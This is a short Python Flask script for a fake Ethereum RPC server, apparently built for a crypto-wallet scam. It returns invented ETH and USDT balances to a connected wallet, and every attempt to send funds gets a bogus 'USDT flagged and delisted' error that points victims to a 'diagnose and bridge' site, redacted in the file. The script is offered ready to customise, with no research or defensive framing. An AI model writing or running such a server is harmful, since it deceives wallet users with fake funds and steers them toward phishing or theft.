from flask import Flask, request, jsonify

app = Flask(__name__)

# Customize this:
USDT_FAKE_BALANCE = "0x8ac7230489e80000"  # 10 USDT in hex (18 decimals)
ETH_FAKE_BALANCE = "0xde0b6b3a764000"     # 0.001 ETH in hex (gas funds)
CHAIN_ID_HEX = "0x539"                    # 1337 in hex

@app.route("/", methods=["POST"])
def fake_rpc():
    payload = request.get_json()

    method = payload.get("method")
    params = payload.get("params", [])
    response_id = payload.get("id")

    if method == "eth_chainId":
        return jsonify({
            "jsonrpc": "2.0",
            "id": response_id,
            "result": CHAIN_ID_HEX
        })

    elif method == "eth_getBalance":
        return jsonify({
            "jsonrpc": "2.0",
            "id": response_id,
            "result": ETH_FAKE_BALANCE
        })

    elif method == "eth_call":
        # Handle contract calls like USDT balanceOf
        if "data" in params[0]:
            data = params[0]["data"]
            if data.startswith("0x70a08231"):  # balanceOf(address)
                return jsonify({
                    "jsonrpc": "2.0",
                    "id": response_id,
                    "result": USDT_FAKE_BALANCE
                })
        return jsonify({
            "jsonrpc": "2.0",
            "id": response_id,
            "result": "0x"
        })

    elif method == "eth_sendRawTransaction":
        return jsonify({
            "jsonrpc": "2.0",
            "id": response_id,
            "error": {
                "code": -32000,
                "message": "USDT Flagged and Delisted in the EU and Parts of the USA, Diagnose and bridge here (www.xxxxxxxx.)"
            }
        })

    # Fallback
    return jsonify({
        "jsonrpc": "2.0",
        "id": response_id,
        "result": None
    })

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=8080)
